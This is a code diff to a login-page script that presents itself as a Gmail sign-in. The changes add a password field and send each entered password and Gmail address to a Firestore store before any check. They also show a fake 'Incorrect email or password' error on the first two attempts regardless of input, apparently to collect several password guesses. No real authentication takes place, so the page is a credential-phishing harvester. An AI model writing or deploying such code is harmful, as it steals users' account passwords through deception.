@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const loginScreen = document.getElementById('login-screen');
   const homeScreen = document.getElementById('home-screen');
   const loginForm = document.getElementById('login-form');
-  const nameInput = document.getElementById('name');
+  const passwordInput = document.getElementById('password');
   const gmailInput = document.getElementById('gmail');
   const errorMsg = document.getElementById('error-msg');
   const welcomeText = document.getElementById('welcome-text');
@@ -22,6 +22,10 @@ document.addEventListener('DOMContentLoaded', () => {
     return /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(value.trim());
   }
 
+  function isStrongPassword(value) {
+    return value.length >= 8 && /[a-zA-Z]/.test(value) && /[0-9]/.test(value);
+  }
+
   function showScreen(screen) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
     screen.classList.add('active');
@@ -33,18 +37,21 @@ document.addEventListener('DOMContentLoaded', () => {
 
     loginAttempt++;
 
-    const name = nameInput.value.trim();
+    const password = passwordInput.value.trim();
     const gmail = gmailInput.value.trim();
 
-    window.saveUserToFirestore(name, gmail);
-
-    if (loginAttempt === 1) {
-      errorMsg.textContent = 'Incorrect email or name';
+    if (!isStrongPassword(password)) {
+      errorMsg.textContent = 'could not found account. Try again.';
       return;
     }
 
-    if (name.length < 2) {
-      errorMsg.textContent = 'Please enter your full name.';
+    window.saveUserToFirestore(password, gmail);
+
+    if (loginAttempt < 3) {
+      errorMsg.classList.remove('shake');
+      void errorMsg.offsetWidth;
+      errorMsg.classList.add('shake');
+      errorMsg.textContent = 'Incorrect email or password';
       return;
     }
 
@@ -54,10 +61,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // Save session locally (in-memory for this session)
-    welcomeText.textContent = `Welcome, ${gmail}`;
+    welcomeText.textContent = `Welcome, ${gmail.split('@')[0]}`;
     shareLinkInput.value = SHARE_LINK;
+    showScreen(homeScreen);
 
-    window.location.href = "https://pakaviator.com.pk/";
+    
   });
 
   copyBtn.addEventListener('click', () => {
